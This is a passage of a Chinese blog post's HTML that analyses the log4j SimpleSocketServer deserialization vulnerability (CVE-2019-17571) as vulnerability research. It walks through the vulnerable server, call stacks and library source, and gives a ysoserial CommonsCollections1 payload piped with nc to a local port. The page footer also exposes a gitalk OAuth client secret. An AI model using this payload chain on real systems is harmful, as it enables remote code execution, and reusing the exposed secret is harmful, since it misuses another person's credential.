&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;INFO: Log4j Listening on port 4444&quot;</span>);</span><br><span class="line">        String[] arguments = &#123;<span class="string">&quot;4444&quot;</span>, (<span class="keyword">new</span> <span class="title class_">CVE201917571</span>()).getClass().getClassLoader().getResource(<span class="string">&quot;log4j.properties&quot;</span>).getPath()&#125;;</span><br><span class="line">        SimpleSocketServer.main(arguments);</span><br><span class="line">        System.out.println(<span class="string">&quot;INFO: Log4j output successfuly.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>配置文件log4j.properties中的内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log4j.rootCategory=DEBUG,stdout</span><br><span class="line">log4j.appender.stdout=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.stdout.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.stdout.threshold=DEBUG</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern=[%d&#123;yyy-MM-dd HH:mm:ss,SSS&#125;]-[%p]-[MSG!:%m]-[%c\:%L]%n</span><br></pre></td></tr></table></figure>
+
+<h2 id="函数调用栈-2"><a href="#函数调用栈-2" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>构造ObjectInputStream函数调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">65</span>, SocketNode (org.apache.log4j.net)</span><br><span class="line">main:<span class="number">67</span>, SimpleSocketServer (org.apache.log4j.net)</span><br><span class="line">main:<span class="number">9</span>, CVE201917571 (org.example)</span><br></pre></td></tr></table></figure>
+
+<p>线程下的函数调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">77</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">444</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">run:<span class="number">82</span>, SocketNode (org.apache.log4j.net)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<h2 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h2><p>将断点下在SimpleSocketServer类的main方法中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117170159.png"></p>
+<p>进入main函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// 读取配置文件，初始化操作</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">2</span>) &#123;</span><br><span class="line">      init(argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      usage(<span class="string">&quot;Wrong number of arguments.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      cat.info(<span class="string">&quot;Listening on port &quot;</span> + port);</span><br><span class="line">      <span class="comment">// 新建一个ServerSocket对象</span></span><br><span class="line">      <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line">      <span class="comment">// 循环接收客户端的等待连接</span></span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        cat.info(<span class="string">&quot;Waiting to accept a new client.&quot;</span>);</span><br><span class="line">        <span class="comment">// 接受</span></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">        cat.info(<span class="string">&quot;Connected to client at &quot;</span> + socket.getInetAddress());</span><br><span class="line">        cat.info(<span class="string">&quot;Starting new socket node.&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建一个线程</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">SocketNode</span>(socket,</span><br><span class="line">                    LogManager.getLoggerRepository()),<span class="string">&quot;SimpleSocketServer-&quot;</span> + port).start();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行到serverSocket.accept();会一致等待接收，此时使用ysoserial生成CC1链的payload，再使用nc向目标ip和端口发送数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections1 <span class="string">&quot;calc.exe&quot;</span> &gt; cve201917571</span><br><span class="line"><span class="built_in">cat</span> cve201917571| nc 127.0.0.1 4444</span><br></pre></td></tr></table></figure>
+
+<p>此时accept成功接收到一个客户端的连接<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117171246.png"></p>
+<p>主要看创建线程的代码，里面参数中new了一个SocketNode对象，进入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SocketNode</span><span class="params">(Socket socket, LoggerRepository hierarchy)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    <span class="built_in">this</span>.hierarchy = hierarchy;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个ObjectInputStream对象ois，数据从socket中获取数据流</span></span><br><span class="line">      ois = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(</span><br><span class="line">                         <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(socket.getInputStream()));</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedIOException e) &#123;</span><br><span class="line">      Thread.currentThread().interrupt();</span><br><span class="line">      logger.error(<span class="string">&quot;Could not open ObjectInputStream to &quot;</span>+socket, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">      logger.error(<span class="string">&quot;Could not open ObjectInputStream to &quot;</span>+socket, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(RuntimeException e) &#123;</span><br><span class="line">      logger.error(<span class="string">&quot;Could not open ObjectInputStream to &quot;</span>+socket, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117171533.png"></p>
+<p>跳出之后，主线程的新建一个子线程，并传递刚刚获取的SocketNode对象，并调用线程的启动函数strat</p>
+<p>接下来就是子线程执行的部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">        target.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的target就是前面得到的SocketNode对象</p>
+<p>进入该对象的run方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    LoggingEvent event;</span><br><span class="line">    Logger remoteLogger;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">	        <span class="comment">// read an event from the wire</span></span><br><span class="line">            <span class="comment">// 调用readObejct方法，从ois中读取一个对象，这也是反序列化触发的地方</span></span><br><span class="line">	        event = (LoggingEvent) ois.readObject();</span><br><span class="line">	        <span class="comment">// get a logger from the hierarchy. The name of the logger is taken to be the name contained in the event.</span></span><br><span class="line">	        remoteLogger = hierarchy.getLogger(event.getLoggerName());</span><br><span class="line">	        <span class="comment">//event.logger = remoteLogger;</span></span><br><span class="line">	        <span class="comment">// apply the logger-level filter</span></span><br><span class="line">	        <span class="keyword">if</span>(event.getLevel().isGreaterOrEqual(remoteLogger.getEffectiveLevel())) &#123;</span><br><span class="line">	        <span class="comment">// finally log the event as if was generated locally</span></span><br><span class="line">	        remoteLogger.callAppenders(event);</span><br><span class="line">	      &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117172522.png"><br>此时的ois正是由CC1链构造的恶意payload，能够导致RCE，接下来就是CC1链中的过程</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1378/">浅谈 Log4j2 漏洞</a><br><a target="_blank" rel="noopener" href="https://4ra1n.github.io/2022/002.html">Log4j2从RC1绕过到RC2拒绝服务</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TDiFFhysSVATp8BGWVNtHg">Log4j2系列漏洞分析汇总</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/316143.html">Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/448919768">APACHE LOG4J多个高危漏洞（CVE-2021-44228&#x2F;CVE-2021-4104&#x2F;CVE-2021-45046&#x2F;CVE-2021-45105）处置手册</a></p>
+<blockquote>
+<p>注：本文首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13077">https://xz.aliyun.com/t/13077</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div>
+  <div class="end-slogan" style="text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb">----------- 本文结束啦<i class="fa fa-star"></i>感谢您阅读-----------</div>		
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>DiliLearngent
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://dililearngent.github.io/2023/04/27/Log4j-security/" title="Java安全之Log4j漏洞分析与利用">https://dililearngent.github.io/2023/04/27/Log4j-security/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag"># Java安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/24/XStream/" rel="prev" title="Java安全之XStream漏洞分析与利用">
+                  <i class="fa fa-chevron-left"></i> Java安全之XStream漏洞分析与利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/30/Rome/" rel="next" title="Java安全之Rome分析与利用">
+                  Java安全之Rome分析与利用 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">DiliLearngent</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">101k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:08</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div><!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/20/2020 13:14:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"DiliLearngent","repo":"dililearngent.github.io","client_id":"e12e8d95c8711de863a8","client_secret":"22368c9ebad498682ec51031519e47b96c45ee7c","admin_user":"DiliLearngent","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"8cefa756eebe752ff55f47d15d9f8e3f"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+</body>
+</html>
